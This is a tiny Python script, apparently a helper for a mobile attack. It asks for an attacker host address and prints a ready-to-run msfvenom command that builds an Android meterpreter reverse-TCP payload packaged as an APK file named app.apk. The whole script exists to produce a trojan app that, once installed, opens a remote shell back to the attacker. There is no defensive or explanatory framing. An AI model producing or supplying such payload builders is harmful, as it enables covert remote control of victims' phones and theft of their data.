lhost = input("lhost:")

print("./msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=4444 R >/sdcard/app.apk")

